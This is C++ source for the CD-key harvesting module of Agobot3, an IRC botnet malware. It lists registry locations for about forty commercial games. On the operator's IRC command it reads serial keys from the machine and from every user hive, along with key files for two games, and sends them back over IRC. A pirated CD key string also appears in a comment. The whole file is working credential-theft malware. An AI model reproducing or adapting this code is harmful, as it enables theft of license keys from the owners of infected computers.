/*$T harvest_cdkeys.cpp GC 1.138 03/07/04 16:17:10 */

/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#ifdef __COMPILE_HARVEST_CDKEYS__
#include "harvest_cdkeys.h"


/* Leet cdkey code by thegeek:) */


#ifdef WIN32
struct items
{
	char	*GameName;
	HKEY	RootKey;
	char	*SubKey;
	char	*ValueName;
};

#define MAX_KEY_LENGTH	2048
#define MAX_VALUE_NAME	16383

/* Initial struct idea and some data taken from D-One's snag.cpp
 * CDKey List, With GameNames and Registry Entries £
 * Here Is Where You Would Add New Games If You Wanted Too
 * TODO: add support for getting from files.
 */
items	CDKeyList[] =
{
	//{ "[Windows Product ID: ", HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", "ProductID" },
	{ "[Battlefield 1942: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", "" },
	{ "[Battlefield 1942: Secret Weapons Of WWII: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc", "" },
	{ "[Battlefield 1942: The Road To Rome: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc", "" },
	{ "[Battlefield Vietnam:", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc", "" },
	{ "[Black and White: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Black and White\\ergc", "" },
	{ "[Chrome: ", HKEY_LOCAL_MACHINE, "Software\\Techland\\Chrome", "SerialNumber" },
	{ "[Command and Conquer: Generals: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Generals\\ergc",	"" },
	{ "[Command and Conquer: Generals: Zero Hour: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc", "" },
	{ "[Command and Conquer: Red Alert2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Red Alert 2", "Serial" },
	{ "[Command and Conquer: Tiberian Sun: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Tiberian Sun", "Serial" },
	{ "[Counter-Strike: ", HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", "Key" },
	{ "[FIFA 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc", "" },
	{ "[FIFA 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", "" },
	{ "[Freedom Force: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc", "" },
	{ "[Global Operations: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations\\ergc", "" },
	{ "[Gunman Chronicles: ", HKEY_CURRENT_USER, "Software\\Valve\\Gunman\\Settings", "Key" },
	{ "[Half-Life: ", HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", "Key" },
	{ "[Hidden and Dangerous 2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key" },
	{ "[IGI2: Covert Strike: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey" },
	{ "[Industry Giant 2: ", HKEY_CURRENT_USER, "Software\\JoWooD\\InstalledGames\\IG2", "prvkey" },
	{ "[James Bond 007: Nightfire: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc", "" },
	{ "[Legends of Might and Magic: ", HKEY_CURRENT_USER, "Software\\3d0\\Status", "CustomerNumber" },
	{ "[Medal of Honor: Allied Assault: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Breakthrough ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Spearhead ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc", "" },
	{ "[NOX: ", HKEY_LOCAL_MACHINE, "Software\\Westwood\\NOX", "Serial" },
	{ "[Nascar Racing 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc",	"" },
	{ "[Nascar Racing 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc",	"" },
	{ "[NHL 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002\\ergc", "" },
	{ "[NHL 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003\\ergc", "" },
	{ "[Need For Speed: Hot Pursuit 2: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", "" },
	{ "[Need For Speed: Underground: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc", "" },
	{ "[Need For Speed: Underground 2: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground 2\\ergc", "" },
  	{ "[Neverwinter Nights: ", HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter","Key" },
	{ "[Rainbow Six III Ravenshield: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", ""},
	{ "[Shogun: Total War: Warlord Edition: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc", "" },
	{ "[Soldiers Of Anarchy: ", HKEY_CURRENT_USER,	"Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings", "CDKey" },
	{ "[Soldier Of Fortune 2: ",HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", "sof2key" },
	{ "[The Gladiators: ", HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators", "RegNumber" },
	{ "[Unreal Tournament 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2003", "CDKey" },
	{ "[Unreal Tournament 2004: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004", "CDKey" },
	
};
#endif // WIN32

char	szKey[1024];
char	*szLogText;

/*
 =======================================================================================================================
 =======================================================================================================================
 */
bool CHarvest_CDKeys::Init() { return true; }

/*
 =======================================================================================================================
 =======================================================================================================================
 */
bool CHarvest_CDKeys::HandleCommand(CMessage *pMsg)
{
#ifdef WIN32
	if(!pMsg->sCmd.Compare(m_cmdCDKeys.szName))
	{
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
#define arraysize(x)	(sizeof(x) / sizeof(x[0]))
		DWORD			dwSize = 2048;
		unsigned char	szBuffer[2048];
		int				i=0;
		char			*UserKey = (char *) malloc(128);
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

		szLogText = new char[2048];
		memset(szLogText, 0, 2048);

		if (!g_pMainCtrl->m_pBot->cdkey_windows.bValue){
				i=1;}
		for(i;i < arraysize(CDKeyList); i++)
		{


			if(CDKeyList[i].RootKey != HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~*/
				HKEY	rk = NULL;
				/*~~~~~~~~~~~~~~*/

				sprintf(UserKey, "%s", CDKeyList[i].SubKey);
				memset(szBuffer, 0, sizeof(szBuffer));
				memset(szKey, 0, sizeof(szKey));
				memset(szLogText, 0, sizeof(szLogText));
				if(RegOpenKeyEx(CDKeyList[i].RootKey, UserKey, 0, KEY_READ, &rk) != ERROR_SUCCESS)
				{
				}

				if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) != ERROR_SUCCESS)
				{
				}

				if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) == ERROR_SUCCESS)
				{
					pMsg->pReply->DoReplyF(pMsg, "%s%s]", CDKeyList[i].GameName, szBuffer);
				}

				RegCloseKey(rk);

				/*
				 * strcat(szLogText, rKeyString); £
				 * ReadKey(szKey, CDKeyList[i].GameName, CDKeyList[i].RootKey,CDKeyList[i].SubKey,
				 * CDKeyList[i].ValueName, dwSize, szBuffer);
				 * g_cMainCtrl.m_pIRC->SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), szKey);
				 */
			}

			if(CDKeyList[i].RootKey == HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
				CHAR		achKey[2048];				/* buffer for subkey name */
				DWORD		cbName;						/* size of name string */
				CHAR		achClass[MAX_PATH] = "";	/* buffer for class name */
				DWORD		cchClassName = MAX_PATH;	/* size of class string */
				DWORD		cSubKeys = 0;				/* number of subkeys */
				DWORD		cbMaxSubKey;				/* longest subkey size */
				DWORD		cchMaxClass;				/* longest class string */
				DWORD		cValues;					/* number of values for key */
				DWORD		cchMaxValue;				/* longest value name */
				DWORD		cbMaxValueData;				/* longest value data */
				DWORD		cbSecurityDescriptor;		/* size of security descriptor */
				FILETIME	ftLastWriteTime;			/* last write time */
				DWORD		retCode;
				unsigned int			u;
				CHAR		achValue[MAX_VALUE_NAME];
				DWORD		cchValue = MAX_VALUE_NAME;
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

				/*
				 * g_cMainCtrl.m_pIRC->SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), CDKeyList[i].GameName); £
				 * Get the class name and the value count.
				 */
				retCode = RegQueryInfoKey
					(
						CDKeyList[i].RootKey,			/* key handle */
						achClass,						/* buffer for class name */
						&cchClassName,					/* size of class string */
						NULL,					/* reserved */
						&cSubKeys,				/* number of subkeys */
						&cbMaxSubKey,			/* longest subkey size */
						&cchMaxClass,			/* longest class string */
						&cValues,				/* number of values for this key */
						&cchMaxValue,			/* longest value name */
						&cbMaxValueData,		/* longest value data */
						&cbSecurityDescriptor,	/* security descriptor */
						&ftLastWriteTime		/* last write time */
					);

				/* Enumerate the subkeys, until RegEnumKeyEx fails. */
				if(cSubKeys)
				{
					for(u = 0; u < cSubKeys; u++)
					{
						cbName = MAX_KEY_LENGTH;
						retCode = RegEnumKeyEx(HKEY_USERS, u, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime);
						if(retCode == ERROR_SUCCESS)
						{
							/*~~~~~~~~~~~~~~*/
							HKEY	rk = NULL;
							/*~~~~~~~~~~~~~~*/

							sprintf(UserKey, "%s\\%s", achKey, CDKeyList[i].SubKey);
							memset(szBuffer, 0, sizeof(szBuffer));
							memset(szKey, 0, sizeof(szKey));
							if(RegOpenKeyEx(HKEY_USERS, UserKey, 0, KEY_READ, &rk) == ERROR_SUCCESS)
							{
								if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize)==ERROR_SUCCESS)
									if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize)==ERROR_SUCCESS)
										pMsg->pReply->DoReplyF(pMsg, "%s%s]", CDKeyList[i].GameName, szBuffer);

								RegCloseKey(rk);
							}
						}
					}
				}
			}
		}
		
		#define removeTrailingCRLF(x)                    \
			size_t len = ::strlen(x);                    \
			for(size_t c = len-1, d=0;d < len; --c, ++d) \
				if (x[c] == '\r' || x[c] == '\n')        \
					x[c] = 0;                            \
				else                                     \
					break;

		HKEY hkey=NULL; unsigned char szDataBuf[128]; unsigned char szDataBuf2[1024]; char line[100];

		dwSize = 128; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	char *szPath = (char*)malloc(MAX_PATH); FILE *fp;
			sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	if(fgets(line, 100, fp))
				{
					removeTrailingCRLF(line);
					if(!strstr(line, "mtkwftmkemfew3p3b7"))
					{	pMsg->pReply->DoReplyF(pMsg, "[Found SOF2 CDKey (%s).]", line); }
				}
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);

		/*
				Call of Duty
		*/

		// Warezed: TSH3XSWTYPWGUUTXE660

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Call of Duty", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	char *szPath = (char*)malloc(MAX_PATH); FILE *fp;
			sprintf(szPath, "%s\\main\\%s", szDataBuf2, "codkey");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	if(fgets(line, 100, fp))
				{
					removeTrailingCRLF(line);

					if(!strstr(line, "TSH3XSWTYPWGUUTXE660"))
						pMsg->pReply->DoReplyF(pMsg, "[Found COD CDKey (%s).]", line);
				}
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);




		return true;
	}
#endif // WIN32
	return false;
}

REGOBJ(CHarvest_CDKeys, g_pHarvest_CDKeys, false, 0);
REGCMD(m_cmdCDKeys, "harvest.cdkeys", false, g_pHarvest_CDKeys);

#endif // __COMPILE_HARVEST_CDKEYS__
